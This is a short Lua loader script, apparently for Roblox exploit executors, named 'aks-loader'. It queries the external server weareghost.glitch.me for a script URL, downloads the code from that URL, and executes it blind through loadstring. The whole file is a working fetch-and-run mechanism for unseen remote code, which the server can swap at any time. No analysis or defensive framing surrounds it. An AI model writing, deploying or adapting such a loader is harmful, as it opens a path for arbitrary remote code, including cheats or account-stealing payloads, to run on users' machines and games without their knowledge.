local HttpService = game:GetService("HttpService")
local SERVER_URL  = "http://weareghost.glitch.me"
local SCRIPT_NAME = "aks-loader"

local function HttpGetRaw(url)
    local ok, resp = pcall(function()
        return http.request({ Url = url, Method = "GET" })
    end)
    if not ok or type(resp) ~= "table" or not resp.Body then
        return nil
    end
    return resp.Body
end

local function LoadRemoteScript(name)
    local genBody = HttpGetRaw(SERVER_URL.."/load/"..name)
    if not genBody then return end
    local data = HttpService:JSONDecode(genBody)
    repeat wait() until data
    if type(data) ~= "table" or not data.url then return end
    local scriptCode = HttpGetRaw(data.url)
    if not scriptCode then return end
    local func = loadstring(scriptCode)
    if not func then return end
    pcall(func)
end

LoadRemoteScript(SCRIPT_NAME)
